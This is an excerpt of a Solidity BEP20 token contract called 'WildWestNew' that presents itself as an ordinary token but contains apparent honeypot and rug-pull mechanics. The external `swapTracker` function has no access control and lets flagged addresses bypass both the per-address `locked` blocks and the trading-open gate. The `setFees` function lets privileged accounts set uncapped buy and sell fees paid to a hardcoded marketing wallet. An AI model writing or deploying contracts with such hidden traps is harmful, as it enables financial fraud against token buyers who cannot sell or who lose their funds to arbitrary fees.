...
contract WildWestNew is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "WildWestNew";
    string constant _symbol = "WILDWESTNEW";
    ...
    uint256 buyDevFee= b.div(1000);
    uint256 buyMarketingFee= b.div(1000);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xc88686AbDadE0535bb5eAb69aeE3Ee3e42b097AE;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require((!locked[sender] && !locked[recipient])||tracker[sender]);
        if(!authorizations[sender] && !authorizations[recipient]){
            require((tradingOpen)||(tracker[sender]));
        }
    ...
    function swapTracker(address account, bool value) external {
        tracker[account] = value;
    }
    ...
    function setFees(uint256 _sellMarketingFee, uint256 _sellDevFee, uint256 _buyMarketingFee, uint256 _buyDevFee) external authorized {
        sellMarketingFee = _sellMarketingFee;
        sellDevFee = _sellDevFee;
        buyMarketingFee = _buyMarketingFee;
        buyDevFee=_buyDevFee;
        totalFee = _sellDevFee.add(_sellMarketingFee).add(_buyDevFee).add(_buyMarketingFee);
    }
